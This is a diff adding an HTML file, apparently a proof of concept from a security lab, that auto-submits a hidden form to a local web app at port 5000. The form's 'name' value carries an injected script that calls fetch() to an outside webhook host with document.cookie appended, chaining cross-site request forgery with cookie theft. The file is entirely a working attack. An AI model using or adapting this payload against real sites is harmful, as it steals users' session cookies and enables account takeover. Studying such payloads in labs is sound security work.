@@ -1,0 +1,11 @@
+<html>
+  <body>
+    <form action="http://127.0.0.1:5000/your-name#behindthename-redirect" method="POST" id="csrf-form">
+      <input type="hidden" name="name" value='\";fetch(`//helpful-autumn-15.webhook.cool`+document.cookie);//' />
+    </form>
+
+    <script>
+      document.getElementById('csrf-form').submit();
+    </script>
+  </body>
+</html>
